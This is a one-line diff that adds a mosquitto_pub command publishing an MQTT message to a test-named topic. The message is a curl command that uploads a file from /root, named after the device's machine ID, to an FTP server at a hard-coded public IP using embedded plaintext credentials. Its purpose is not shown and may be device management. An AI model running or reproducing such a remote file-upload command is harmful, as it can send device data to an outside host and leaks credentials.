@@ -1,0 +1,1 @@
+mosquitto_pub -p 2201 -t PATCHTEST_M_0 -m curl --connect-timeout 32 --max-time 64 -s -u rnd:rnd123 -T /root/`fw_printenv machineid`.txt ftp://115.111.229.10/PosDesk_Update/ -q 2
